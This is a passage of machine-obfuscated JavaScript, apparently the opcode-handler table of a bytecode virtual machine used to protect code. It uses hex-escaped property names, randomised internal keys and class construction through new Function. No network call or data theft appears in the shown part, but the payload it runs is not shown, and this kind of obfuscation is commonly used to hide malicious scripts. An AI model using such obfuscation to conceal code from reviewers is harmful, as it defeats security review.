xa=xR(),xt=xR();xx(xt&xa),Q++;break;}},function(xv){while(!![]){if(T['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68']>0x0){let xa=T[T['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68']-0x1];xa['_$I5WncY']===Q&&(xa['_$UzO0c6']!==undefined&&(x0=xa['_$UzO0c6']),T['\x70'+'\x6f'+'\x70']());}Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=xR();xx(xt>=xa),Q++;break;}},function(xv){while(!![]){xx(+xR()),Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=xR(),xU=J_132fec['_$pa13eK'];J_132fec['_$pa13eK']=undefined;try{let xN=xt['\x61'+'\x70'+'\x70'+'\x6c'+'\x79'](undefined,l(xR,xa));xx(xN);}finally{J_132fec['_$pa13eK']=xU;}Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=xR();xx(xt<=xa),Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=xR(),xU=xS();Object['\x64'+'\x65'+'\x66'+'\x69'+'\x6e'+'\x65'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'](xU['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'],xt,{'\x76\x61\x6c\x75\x65':xa,'\x77\x72\x69\x74\x61\x62\x6c\x65':!![],'\x65\x6e\x75\x6d\x65\x72\x61\x62\x6c\x65':![],'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':!![]}),Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=xR(),xU=k[xv];if(J_132fec['_$iZ9Ctg']){let xw=J_132fec['_$iZ9Ctg'],xc="set_"+xU,xM=xw['\x67'+'\x65'+'\x74'](xc);if(xM&&xM['\x68'+'\x61'+'\x73'](xt)){let xp=xM['\x67'+'\x65'+'\x74'](xt);xp['\x63'+'\x61'+'\x6c'+'\x6c'](xt,xa),xx(xa),Q++;break;}let xW=xw['\x67'+'\x65'+'\x74'](xU);if(xW&&xW['\x68'+'\x61'+'\x73'](xt)){xW['\x73'+'\x65'+'\x74'](xt,xa),xx(xa),Q++;break;}}let xN='_$5nAHRc'+xU['\x73'+'\x75'+'\x62'+'\x73'+'\x74'+'\x72'+'\x69'+'\x6e'+'\x67'](0x1)+'_$NTag4F';if(xN in xt){xt[xN]=xa,xx(xa),Q++;break;}throw new TypeError("Cannot write private member "+xU+" to an object whose class did not declare it");break;}},function(xv){while(!![]){let xa=xv&0xffff,xt=xv>>>0x10;xx(s[xa]+k[xt]),Q++;break;}},function(xv){while(!![]){xR()?Q=xY(L[Q]):Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=xR();xx(xt===xa),Q++;break;}},function(xv){while(!![]){if(xv===-0x1)xx(Symbol());else{let xa=xR();xx(Symbol(xa));}Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=xR();xx(xt instanceof xa),Q++;break;}},function(xv){while(!![]){s[xv]=s[xv]-0x1,Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=xS();xt['\x70'+'\x75'+'\x73'+'\x68'](xa),Q++;break;}},function(xv){while(!![]){let xa=xv&0xffff,xt=xv>>>0x10,xU=xR(),xN=l(xR,xU),xw=s[xa],xc=k[xt],xM=xw[xc];xx(xM['\x61'+'\x70'+'\x70'+'\x6c'+'\x79'](xw,xN)),Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=xS();if(xa===null){Object['\x73'+'\x65'+'\x74'+'\x50'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'+'\x4f'+'\x66'](xt['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'],null),Object['\x73'+'\x65'+'\x74'+'\x50'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'+'\x4f'+'\x66'](xt,Function['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65']),xt['_$NN1NaI']=null,Q++;break;}let xU=![];try{let xN=Object['\x63'+'\x72'+'\x65'+'\x61'+'\x74'+'\x65'](xa['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65']),xw=xa['\x61'+'\x70'+'\x70'+'\x6c'+'\x79'](xN,[]);xw!==undefined&&xw!==xN&&(xU=!![]);}catch(xc){xc instanceof TypeError&&(xc['\x6d'+'\x65'+'\x73'+'\x73'+'\x61'+'\x67'+'\x65']['\x69'+'\x6e'+'\x63'+'\x6c'+'\x75'+'\x64'+'\x65'+'\x73']("'new'")||xc['\x6d'+'\x65'+'\x73'+'\x73'+'\x61'+'\x67'+'\x65']['\x69'+'\x6e'+'\x63'+'\x6c'+'\x75'+'\x64'+'\x65'+'\x73']('constructor')||xc['\x6d'+'\x65'+'\x73'+'\x73'+'\x61'+'\x67'+'\x65']['\x69'+'\x6e'+'\x63'+'\x6c'+'\x75'+'\x64'+'\x65'+'\x73']('Illegal constructor'))&&(xU=!![]);}if(xU){let xM=xt,xW=J_132fec,xp='_$9k6c7p',xI='_$B5x41z',xV='_$superCalled';try{let xs=new Function('ParentClass','vmCtorFunc','vmGlobals','ntKey','ctKey','scKey','let RC = class extends ParentClass {'+'  constructor(...args) {'+'    super(...args);'+'    vmGlobals[scKey] = true;'+'    vmGlobals[ctKey] = new.target || RC;'+'    let hadNt = ntKey in vmGlobals;'+'    if (!hadNt) vmGlobals[ntKey] = new.target;'+'    try {'+'      vmCtorFunc.apply(this, args);'+'    } finally {'+'      delete vmGlobals[scKey];'+'      delete vmGlobals[ctKey];'+'      if (!hadNt) delete vmGlobals[ntKey];'+'    }'+'  }'+'};'+'return RC;')(xa,xM,xW,xp,xI,xV);Object['\x67'+'\x65'+'\x74'+'\x4f'+'\x77'+'\x6e'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'+'\x4e'+'\x61'+'\x6d'+'\x65'+'\x73'](xM)['\x66'+'\x6f'+'\x72'+'\x45'+'\x61'+'\x63'+'\x68'](function(xQ){if(xQ!=='prototype'&&xQ!=='length'&&xQ!=='name')try{Object['\x64'+'\x65'+'\x66'+'\x69'+'\x6e'+'\x65'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'](xs,xQ,Object['\x67'+'\x65'+'\x74'+'\x4f'+'\x77'+'\x6e'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'+'\x44'+'\x65'+'\x73'+'\x63'+'\x72'+'\x69'+'\x70'+'\x74'+'\x6f'+'\x72'](xM,xQ));}catch(xk){}});xM['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65']&&(Object['\x67'+'\x65'+'\x74'+'\x4f'+'\x77'+'\x6e'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'+'\x4e'+'\x61'+'\x6d'+'\x65'+'\x73'](xM['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'])['\x66'+'\x6f'+'\x72'+'\x45'+'\x61'+'\x63'+'\x68'](function(xQ){if(xQ!=='constructor')try{Object['\x64'+'\x65'+'\x66'+'\x69'+'\x6e'+'\x65'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'](xs['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'],xQ,Object['\x67'+'\x65'+'\x74'+'\x4f'+'\x77'+'\x6e'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'+'\x44'+'\x65'+'\x73'+'\x63'+'\x72'+'\x69'+'\x70'+'\x74'+'\x6f'+'\x72'](xM['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'],xQ));}catch(xk){}}),Object['\x67'+'\x65'+'\x74'+'\x4f'+'\x77'+'\x6e'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'+'\x53'+'\x79'+'\x6d'+'\x62'+'\x6f'+'\x6c'+'\x73'](xM['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'])['\x66'+'\x6f'+'\x72'+'\x45'+'\x61'+'\x63'+'\x68'](function(xQ){try{Object['\x64'+'\x65'+'\x66'+'\x69'+'\x6e'+'\x65'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'](xs['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'],xQ,Object['\x67'+'\x65'+'\x74'+'\x4f'+'\x77'+'\x6e'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'+'\x44'+'\x65'+'\x73'+'\x63'+'\x72'+'\x69'+'\x70'+'\x74'+'\x6f'+'\x72'](xM['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'],xQ));}catch(xk){}}));xR(),xx(xs),xs['_$NN1NaI']=xa,Q++;break;}catch(xQ){}}Object['\x73'+'\x65'+'\x74'+'\x50'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'+'\x4f'+'\x66'](xt['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'],xa['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65']),Object['\x73'+'\x65'+'\x74'+'\x50'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'+'\x4f'+'\x66'](xt,xa),xt['_$NN1NaI']=xa,Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=k[xv];if(J_132fec['_$iZ9Ctg']){let xN=J_132fec['_$iZ9Ctg'],xw="get_"+xt,xc=xN['\x67'+'\x65'+'\x74'](xw);if(xc&&xc['\x68'+'\x61'+'\x73'](xa)){let xW=xc['\x67'+'\x65'+'\x74'](xa);xx(xW['\x63'+'\x61'+'\x6c'+'\x6c'](xa)),Q++;break;}let xM=xN['\x67'+'\x65'+'\x74'](xt);if(xM&&xM['\x68'+'\x61'+'\x73'](xa)){xx(xM['\x67'+'\x65'+'\x74'](xa)),Q++;break;}}let xU='_$5nAHRc'+xt['\x73'+'\x75'+'\x62'+'\x73'+'\x74'+'\x72'+'\x69'+'\x6e'+'\x67'](0x1)+'_$NTag4F';if(xU in xa){xx(xa[xU]),Q++;break;}throw new TypeError("Cannot read private member "+xt+" from an object whose class did not declare it");break;}},function(xv){while(!![]){let xa=xi(0x3),xt=xi(0x2),xU=xS();xA(0x3,xt),xA(0x2,xU),xb(xa),Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=xR(),xU=xS(),xN=typeof xU==='function'&&xU['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65']?xU['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65']:xU;Object['\x64'+'\x65'+'\x66'+'\x69'+'\x6e'+'\x65'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'](xN,xt,{'\x67\x65\x74':xa,'\x65\x6e\x75\x6d\x65\x72\x61\x62\x6c\x65':xN===xU,'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':!![]}),Q++;break;}},function(xv){while(!![]){s[xv]=xR(),Q++;break;}},function(xv){while(!![]){let xa=xR();xx(xa),xx(xa),Q++;break;}},function(xv){while(!![]){let xa=k[xv],xt=xR(),xU=xy['_$h1dVob'];xU&&(xU['_$TDiWlH'][xa]=xt);Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=m(xa),xU=xt&&xt['a'],xN=xt&&xt['s'],xw=xt&&xt['g'],xc=xt&&xt['m'],xM=xy,xW=O,xp=f,xI=G,xV=xt&&xt['ni']!==undefined?xt['c'][xt['ni']]:undefined,xs=xt&&xt['p']||0x0,xQ=xU?p:undefined,xk=function(xh,xL,xz,xZ,xT,R0,R1,R2,R3,R4,R5){let R6,R7;if(xT)R7=function(){let R8=[];for(let R9=0x0;R9<arguments['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68'];R9++){R8['\x70'+'\x75'+'\x73'+'\x68'](arguments[R9]);}return R2['\x63'+'\x61'+'\x6c'+'\x6c'](this,xh,R8,xL,R6);};else xZ?R7=async function(){let R8=[];for(let Rx=0x0;Rx<arguments['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68'];Rx++){R8['\x70'+'\x75'+'\x73'+'\x68'](arguments[Rx]);}let R9=new.target!==undefined?new.target:J_132fec['_$9k6c7p'];return xz?await R1['\x63'+'\x61'+'\x6c'+'\x6c'](R4,xh,R8,xL,R6,undefined):await R1['\x63'+'\x61'+'\x6c'+'\x6c'](this,xh,R8,xL,R6,R9);}:R7=function(){let R8=[];for(let Rx=0x0;Rx<arguments['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68'];Rx++){R8['\x70'+'\x75'+'\x73'+'\x68'](arguments[Rx]);}let R9=new.target!==undefined?new.target:J_132fec['_$9k6c7p'];return xz?R0['\x63'+'\x61'+'\x6c'+'\x6c'](R4,xh,R8,xL,R6,undefined):R0['\x63'+'\x61'+'\x6c'+'\x6c'](this,xh,R8,xL,R6,R9);};R6=R7;if(R3)try{Object['\x64'+'\x65'+'\x66'+'\x69'+'\x6e'+'\x65'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'](R6,'name',{'\x76\x61\x6c\x75\x65':R3,'\x77\x72\x69\x74\x61\x62\x6c\x65':![],'\x65\x6e\x75\x6d\x65\x72\x61\x62\x6c\x65':![],'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':!![]});}catch(R8){}try{Object['\x64'+'\x65'+'\x66'+'\x69'+'\x6e'+'\x65'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'](R6,'length',{'\x76\x61\x6c\x75\x65':R5,'\x77\x72\x69\x74\x61\x62\x6c\x65':![],'\x65\x6e\x75\x6d\x65\x72\x61\x62\x6c\x65':![],'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':!![]});}catch(R9){}return R6;}(xa,xM,xU,xN,xw,xW,xp,xI,xV,xQ,xs);if(xc)try{Object['\x64'+'\x65'+'\x66'+'\x69'+'\x6e'+'\x65'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'](xk,'prototype',{'\x76\x61\x6c\x75\x65':undefined,'\x77\x72\x69\x74\x61\x62\x6c\x65':![],'\x65\x6e\x75\x6d\x65\x72\x61\x62\x6c\x65':![],'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':![]});}catch(xh){}if(!xk)throw new Error('VM Error: Failed to create closure');xx(xk),Q++;break;}},function(xv){while(!![]){xx(w[xv]),Q++;break;}},function(xv){while(!![]){let xa=xR();if(xa==null)throw new TypeError('Cannot iterate over '+xa);let xt=xa[Symbol['\x69'+'\x74'+'\x65'+'\x72'+'\x61'+'\x74'+'\x6f'+'\x72']];if(typeof xt!=='function')throw new TypeError('Object is not iterable');xx(xt['\x63'+'\x61'+'\x6c'+'\x6c'](xa)),Q++;break;}},function(xv){while(!![]){let xa=k[xv],xt=xR(),xU=xy,xN=![];while(xU){if(xU['_$TDiWlH']&&xa in xU['_$TDiWlH']){if(xU['_$W7Fy6A']&&xa in xU['_$W7Fy6A'])break;xU['_$TDiWlH'][xa]=xt;!xU['_$W7Fy6A']&&(xU['_$W7Fy6A']={});xU['_$W7Fy6A'][xa]=!![],xN=!![];break;}xU=xU['_$h1dVob'];}!xN&&(xy['_$aVHknk']&&xa in xy['_$aVHknk']&&delete xy['_$aVHknk'][xa],xy['_$TDiWlH'][xa]=xt,!xy['_$W7Fy6A']&&(xy['_$W7Fy6A']={}),xy['_$W7Fy6A'][xa]=!![]);Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=xR(),xU=xv,xN=function(xw,xc,xM){let xW;return xM?xW=function(){if(xc){J_132fec['_$B5x41z']=xW;let xp='_$9k6c7p'in J_132fec;!xp&&(J_132fec['_$9k6c7p']=new.target);try{let xI=[];for(let xV=0x0;xV<arguments['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68'];xV++){xI['\x70'+'\x75'+'\x73'+'\x68'](arguments[xV]);}return xc['\x61'+'\x70'+'\x70'+'\x6c'+'\x79'](this,xI);}finally{delete J_132fec['_$B5x41z'],!xp&&delete J_132fec['_$9k6c7p'];}}}:xW=function(){if(xc){let xp='_$9k6c7p'in J_132fec;!xp&&(J_132fec['_$9k6c7p']=new.target);try{let xI=[];for(let xV=0x0;xV<arguments['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68'];xV++){xI['\x70'+'\x75'+'\x73'+'\x68'](arguments[xV]);}return xc['\x61'+'\x70'+'\x70'+'\x6c'+'\x79'](this,xI);}finally{!xp&&delete J_132fec['_$9k6c7p'];}}},xW;}(xa,xt,xU);xa&&Object['\x64'+'\x65'+'\x66'+'\x69'+'\x6e'+'\x65'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'](xN,'name',{'\x76\x61\x6c\x75\x65':xa,'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':!![]});xx(xN),Q++;break;}},function(xv){while(!![]){return V>0x0?xR():undefined;break;}},function(xv){while(!![]){let xa=s[xv]+0x1;s[xv]=xa,xx(xa),Q++;break;}},function(xv){while(!![]){let xa=xS();xb(xi(0x2)),xA(0x2,xa),Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=xR(),xU=J_132fec['_$pa13eK'],xN;if(xU)xN=Object['\x67'+'\x65'+'\x74'+'\x50'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'+'\x4f'+'\x66'](xU);else{if(typeof xt==='function')xN=Object['\x67'+'\x65'+'\x74'+'\x50'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'+'\x4f'+'\x66'](xt);else{let xW=Object['\x67'+'\x65'+'\x74'+'\x50'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'+'\x4f'+'\x66'](xt),xp=xW&&xW['\x63'+'\x6f'+'\x6e'+'\x73'+'\x74'+'\x72'+'\x75'+'\x63'+'\x74'+'\x6f'+'\x72']&&xW['\x63'+'\x6f'+'\x6e'+'\x73'+'\x74'+'\x72'+'\x75'+'\x63'+'\x74'+'\x6f'+'\x72']['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65']===xW;xp?xN=Object['\x67'+'\x65'+'\x74'+'\x50'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'+'\x4f'+'\x66'](xW):xN=xW;}}let xw=null,xc=xN;while(xc!==null){xw=Object['\x67'+'\x65'+'\x74'+'\x4f'+'\x77'+'\x6e'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'+'\x44'+'\x65'+'\x73'+'\x63'+'\x72'+'\x69'+'\x70'+'\x74'+'\x6f'+'\x72'](xc,xa);if(xw)break;xc=Object['\x67'+'\x65'+'\x74'+'\x50'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65'+'\x4f'+'\x66'](xc);}let xM;if(xw&&xw['\x67'+'\x65'+'\x74'])xM=xw['\x67'+'\x65'+'\x74']['\x63'+'\x61'+'\x6c'+'\x6c'](xt),xx(xM);else{if(xw&&xw['\x73'+'\x65'+'\x74']&&!('value'in xw))xx(undefined);else{xM=xc?xc[xa]:xN[xa];if(typeof xM==='function'){let xI=xc||xN,xV=xM['\x62'+'\x69'+'\x6e'+'\x64'](xt),xs=xM['\x63'+'\x6f'+'\x6e'+'\x73'+'\x74'+'\x72'+'\x75'+'\x63'+'\x74'+'\x6f'+'\x72']&&xM['\x63'+'\x6f'+'\x6e'+'\x73'+'\x74'+'\x72'+'\x75'+'\x63'+'\x74'+'\x6f'+'\x72']['\x6e'+'\x61'+'\x6d'+'\x65'],xQ=xs==='GeneratorFunction'||xs==='AsyncFunction'||xs==='AsyncGeneratorFunction';!xQ&&(!J_132fec['_$vhcgFV']&&(J_132fec['_$vhcgFV']=new WeakMap()),J_132fec['_$vhcgFV']['\x73'+'\x65'+'\x74'](xV,xI)),xx(xV);}else xx(xM);}}Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=xR();xx(xt==xa),Q++;break;}},function(xv){while(!![]){let xa=k[xv],xt=xy,xU,xN=![],xw=xa['\x69'+'\x6e'+'\x64'+'\x65'+'\x78'+'\x4f'+'\x66']('$$')!==-0x1?xa['\x73'+'\x70'+'\x6c'+'\x69'+'\x74']('$$')[0x0]:xa;while(xt){if(xt['_$aVHknk']&&xa in xt['_$aVHknk'])throw new ReferenceError("Cannot access '"+xa+"' before initialization");if(xw!==xa&&xt['_$aVHknk']&&xw in xt['_$aVHknk']){if(!(xt['_$TDiWlH']&&xa in xt['_$TDiWlH']))throw new ReferenceError("Cannot access '"+xw+"' before initialization");}if(xt['_$TDiWlH']&&xa in xt['_$TDiWlH']){xU=xt['_$TDiWlH'][xa],xN=!![];break;}xt=xt['_$h1dVob'];}xa==='__this__'&&(xU=p,xN=!![]);!xN&&(xa in J_132fec?xU=J_132fec[xa]:xU=H[xa]);xx(xU),Q++;break;}},function(xv){while(!![]){let xa=k[xv];xx(Symbol['\x66'+'\x6f'+'\x72'](xa)),Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=k[xv],xU=!(xt in J_132fec)&&!(xt in H);J_132fec[xt]=xa;xt in H&&(H[xt]=xa);xU&&(H[xt]=xa);xx(xa),Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=xR();xx(xt/xa),Q++;break;}},function(xv){while(!![]){let xa=xR();if(xa==null)throw new TypeError('Cannot iterate over '+xa);let xt=xa[Symbol['\x61'+'\x73'+'\x79'+'\x6e'+'\x63'+'\x49'+'\x74'+'\x65'+'\x72'+'\x61'+'\x74'+'\x6f'+'\x72']];if(typeof xt==='function')xx(xt['\x63'+'\x61'+'\x6c'+'\x6c'](xa));else{let xU=xa[Symbol['\x69'+'\x74'+'\x65'+'\x72'+'\x61'+'\x74'+'\x6f'+'\x72']];if(typeof xU!=='function')throw new TypeError('Object is not async iterable');xx(xU['\x63'+'\x61'+'\x6c'+'\x6c'](xa));}Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=xR();xx(xt*xa),Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=k[xv];!J_132fec['_$iZ9Ctg']&&(J_132fec['_$iZ9Ctg']=new Map());let xU=J_132fec['_$iZ9Ctg'],xN="get_"+xt,xw=xU['\x67'+'\x65'+'\x74'](xN);if(xw&&xw['\x68'+'\x61'+'\x73'](xa)){let xp=xw['\x67'+'\x65'+'\x74'](xa);xx(xp['\x63'+'\x61'+'\x6c'+'\x6c'](xa)),Q++;break;}let xc='_$HnpK5c'+"get_"+xt['\x73'+'\x75'+'\x62'+'\x73'+'\x74'+'\x72'+'\x69'+'\x6e'+'\x67'](0x1)+'_$7iRR7j';if(xa['\x63'+'\x6f'+'\x6e'+'\x73'+'\x74'+'\x72'+'\x75'+'\x63'+'\x74'+'\x6f'+'\x72']&&xc in xa['\x63'+'\x6f'+'\x6e'+'\x73'+'\x74'+'\x72'+'\x75'+'\x63'+'\x74'+'\x6f'+'\x72']){let xI=xa['\x63'+'\x6f'+'\x6e'+'\x73'+'\x74'+'\x72'+'\x75'+'\x63'+'\x74'+'\x6f'+'\x72'][xc];xx(xI['\x63'+'\x61'+'\x6c'+'\x6c'](xa)),Q++;break;}let xM=xU['\x67'+'\x65'+'\x74'](xt);if(xM&&xM['\x68'+'\x61'+'\x73'](xa)){xx(xM['\x67'+'\x65'+'\x74'](xa)),Q++;break;}let xW='_$5nAHRc'+xt['\x73'+'\x75'+'\x62'+'\x73'+'\x74'+'\x72'+'\x69'+'\x6e'+'\x67'](0x1)+'_$NTag4F';if(xW in xa){xx(xa[xW]),Q++;break;}throw new TypeError("Cannot read private member "+xt+" from an object whose class did not declare it");break;}},function(xv){while(!![]){let xa=k[xv],xt;if(xa in J_132fec)xt=J_132fec[xa];else{if(xa in H)xt=H[xa];else throw new ReferenceError(xa+' is not defined');}xx(xt),Q++;break;}},function(xv){while(!![]){throw xR();break;}},function(xv){while(!![]){let xa=xR(),xt=xS();xa!==null&&xa!==undefined&&Object['\x61'+'\x73'+'\x73'+'\x69'+'\x67'+'\x6e'](xt,xa);Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=xR();xx(xt in xa),Q++;break;}},function(xv){while(!![]){xx(-xR()),Q++;break;}},function(xv){while(!![]){let xa=xR();xx(!!xa['\x64'+'\x6f'+'\x6e'+'\x65']),Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=xR();xx(Math['\x70'+'\x6f'+'\x77'](xt,xa)),Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=xR();xx(xt%xa),Q++;break;}},function(xv){while(!![]){xx(W),Q++;break;}},function(xv){while(!![]){xx(k[xv]),Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=xR(),xU=k[xv];if(xt===null||xt===undefined)throw new TypeError("Cannot set property '"+String(xU)+"' of "+xt);x5?xt[xU]=xa:Reflect['\x73'+'\x65'+'\x74'](xt,xU,xa);xx(xa),Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=xR();xx(xt!=xa),Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=xR();xx(xt-xa),Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=xS();if(Array['\x69'+'\x73'+'\x41'+'\x72'+'\x72'+'\x61'+'\x79'](xa))Array['\x70'+'\x72'+'\x6f'+'\x74'+'\x6f'+'\x74'+'\x79'+'\x70'+'\x65']['\x70'+'\x75'+'\x73'+'\x68']['\x61'+'\x70'+'\x70'+'\x6c'+'\x79'](xt,xa);else for(let xU of xa){xt['\x70'+'\x75'+'\x73'+'\x68'](xU);}Q++;break;}},function(xv){while(!![]){!xR()?Q=xY(L[Q]):Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=k[xv],xU=![];if(J_132fec['_$iZ9Ctg']){let xN=J_132fec['_$iZ9Ctg'],xw=xN['\x67'+'\x65'+'\x74'](xt);xU=xw&&xw['\x68'+'\x61'+'\x73'](xa);}xx(xU),Q++;break;}},function(xv){while(!![]){xx(xy),Q++;break;}},function(xv){while(!![]){let xa=xv&0xffff,xt=xv>>0x10,xU=k[xa],xN=k[xt];xx(new RegExp(xU,xN)),Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=xR();xx(xt>>>xa),Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=xR();xt===null||xt===undefined?xx(undefined):xx(xt[xa]);Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=xR();xx(xt>xa),Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=l(xR,xa),xU=xR();if(typeof xU!=='function')throw new TypeError(xU+' is not a constructor');let xN=J_132fec['_$pa13eK'];J_132fec['_$pa13eK']=undefined;let xw;try{xw=Reflect['\x63'+'\x6f'+'\x6e'+'\x73'+'\x74'+'\x72'+'\x75'+'\x63'+'\x74'](xU,xt);}finally{J_132fec['_$pa13eK']=xN;}xx(xw),Q++;break;}},function(xv){while(!![]){let xa=k[xv],xt=xR();if(xy['_$aVHknk']){xa in xy['_$aVHknk']&&delete xy['_$aVHknk'][xa];let xU=xa['\x73'+'\x70'+'\x6c'+'\x69'+'\x74']('$$')[0x0];xU!==xa&&xU in xy['_$aVHknk']&&delete xy['_$aVHknk'][xU];}xy['_$TDiWlH'][xa]=xt,Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=xR(),xU=xS();Object['\x64'+'\x65'+'\x66'+'\x69'+'\x6e'+'\x65'+'\x50'+'\x72'+'\x6f'+'\x70'+'\x65'+'\x72'+'\x74'+'\x79'](xU,xt,{'\x73\x65\x74':xa,'\x65\x6e\x75\x6d\x65\x72\x61\x62\x6c\x65':![],'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':!![]}),Q++;break;}},function(xv){while(!![]){let xa=xR(),xt=xR(),xU=xR();if(xU===null||xU===undefined)throw new TypeError("Cannot set property '"+String(xt)+"' of "+xU);x5?xU[xt]=xa:Reflect['\x73'+'\x65'+'\x74'](xU,xt,xa);xx(xa),Q++;break;}},function(xv){while(!![]){if(T['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68']>0x0){let xa=T[T['\x6c'+'\x65'+'\x6e'+'\x67'+'\x74'+'\x68']-0x1];if(xa['_$I5WncY']!==undefined){x1['_$BLHqcK']=!![],x1['_$hG5yMT']=xR(),Q=xa['_$I5WncY'];break;}}x1['_$BLHqcK']&&(x1['_$BLHqcK']=![],x1['_$hG5yMT']=undefined);xJ=!![],xH=xR();return;break;}},function(xv){while(!![]){let 